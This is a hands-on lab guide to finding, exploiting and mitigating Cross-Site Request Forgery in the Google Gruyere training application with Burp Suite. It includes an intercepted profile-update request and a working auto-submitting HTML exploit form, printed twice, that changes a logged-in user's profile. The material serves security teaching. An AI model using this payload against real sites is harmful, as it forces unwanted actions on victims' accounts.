# Project 3: Testing for Cross-Site Request Forgery (CSRF) Vulnerabilities
## Introduction
Cross-Site Request Forgery (CSRF) is a web security vulnerability that allows an attacker to trick a user into performing actions that they do not intend to perform. This can include changing account details, making unauthorized transactions, or any action that the user is authorized to perform. In this project, you will learn how to identify and exploit CSRF vulnerabilities using Google Gruyere, a web application specifically designed for security training.

## Pre-requisites
- Basic understanding of web application concepts and the HTTP protocol.
- Familiarity with HTML and HTTP requests.
- A working installation of Google Gruyere and Burp Suite Community Edition.

## Lab Set-up

### Setting up Google Gruyere
1. **Download and Install Google Gruyere**:
   - Google Gruyere is a hosted application available for testing at [Google Gruyere](https://google-gruyere.appspot.com/).
   - Visit the link and click on "Start hacking" to create a new instance of the Gruyere application.

2. **Get your unique instance**:
   - Note the unique URL provided for your Gruyere instance, e.g., `https://google-gruyere.appspot.com/123456789012/`.

### Setting up Burp Suite
1. **Download and Install Burp Suite**:
   - Download Burp Suite Community Edition from [PortSwigger](https://portswigger.net/burp/communitydownload) and install it.

2. **Configure Burp Suite with your Browser**:
   - Open Burp Suite and go to the "Proxy" tab.
   - Click on "Intercept is on" button to toggle interception off.
   - Go to the "Options" sub-tab and ensure the proxy listener is running on 127.0.0.1:8080.
   - Configure your web browser to use Burp Suite as a proxy (set the proxy server to 127.0.0.1 and port 8080).

## Exercises

### Exercise 1: Identifying CSRF Vulnerabilities

1. **Navigate to Gruyere Application**:
   - Open your browser and navigate to your Gruyere instance URL (e.g., `https://google-gruyere.appspot.com/123456789012/`).

2. **Log in to Gruyere**:
   - Log in with any username and password to create a new session.

3. **Intercept a Request with Burp Suite**:
   - Perform an action such as changing your profile information.
   - Burp Suite will intercept the request. Forward the request to see the result.

4. **Analyze the Request**:
   - Look for the absence of any anti-CSRF tokens in the request.
   - If there are no tokens, the request is likely vulnerable to CSRF attacks.

### Commands and Expected Output

1. **Initial Request Interception**:
   - Request intercepted by Burp Suite:
     ```
     POST /123456789012/profile HTTP/1.1
     Host: google-gruyere.appspot.com
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 32

     name=NewName&about=NewDescription
     ```
   - Expected output: Profile information is updated without any CSRF protection.

### Exercise 2: Exploiting CSRF Vulnerabilities

1. **Crafting a CSRF Attack**:
   - Create an HTML page to exploit the CSRF vulnerability. Save the following content as `csrf_exploit.html`:
     ```html
     <html>
     <body>
       <form action="https://google-gruyere.appspot.com/123456789012/profile" method="POST">
         <input type="hidden" name="name" value="AttackerName">
         <input type="hidden" name="about" value="CompromisedAccount">
         <input type="submit" value="Submit request">
       </form>
       <script>
         document.forms[0].submit();
       </script>
     </body>
     </html>
     ```

2. **Execute the CSRF Attack**:
   - Open the `csrf_exploit.html` file in a browser where you are logged into the Gruyere instance.
   - The form will be automatically submitted, changing the profile information.

3. **Verify the Exploit**:
   - Check the profile page on Gruyere to see if the profile information has been changed to `AttackerName` and `CompromisedAccount`.

### Commands and Expected Output

1. **Crafting the CSRF Attack**:
   - HTML content:
     ```html
     <html>
     <body>
       <form action="https://google-gruyere.appspot.com/123456789012/profile" method="POST">
         <input type="hidden" name="name" value="AttackerName">
         <input type="hidden" name="about" value="CompromisedAccount">
         <input type="submit" value="Submit request">
       </form>
       <script>
         document.forms[0].submit();
       </script>
     </body>
     </html>
     ```

2. **Expected Output**:
   - The profile information on the Gruyere instance is updated to:
     ```
     Name: AttackerName
     About: CompromisedAccount
     ```

### Exercise 3: Mitigating CSRF Vulnerabilities

1. **Implementing Anti-CSRF Tokens**:
   - Modify the application code (if you have access) to include CSRF tokens in forms and verify them on the server side.

2. **Testing the Mitigation**:
   - After applying the mitigation, repeat the CSRF attempt and ensure it is no longer successful.

## Conclusion
By completing these exercises, you will gain hands-on experience in identifying and exploiting CSRF vulnerabilities using Burp Suite and Google Gruyere. Additionally, you will understand the importance of implementing anti-CSRF tokens to protect web applications from CSRF attacks.
